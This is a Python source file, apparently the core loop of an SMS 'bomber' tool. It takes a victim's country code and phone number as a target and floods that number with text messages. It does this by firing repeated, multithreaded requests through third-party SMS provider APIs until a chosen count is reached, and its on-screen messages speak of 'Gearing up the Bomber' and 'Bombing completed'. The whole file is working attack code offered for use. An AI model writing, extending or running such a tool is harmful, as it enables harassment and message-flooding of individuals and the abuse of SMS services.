from functions.prettyprint import pretty_print
from functions.banner import bann_text
import os
import sys
from utils.provider import APIProvider
from concurrent.futures import ThreadPoolExecutor, as_completed

def workernode(mesgdcrt, cc, target, count, delay, max_threads):
    api = APIProvider(cc, target, "sms", delay=delay)
    os.system("clear")
    mesgdcrt.SectionMessage("Gearing up the Bomber")
    mesgdcrt.GeneralMessage("Target        : +" + cc + " " + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
    print()
    input(mesgdcrt.CommandMessage(
        "Press [Ctrl+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text(ascii)
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                os.system("clear")
                pretty_print(mesgdcrt,cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    bann_text(ascii)
    sys.exit()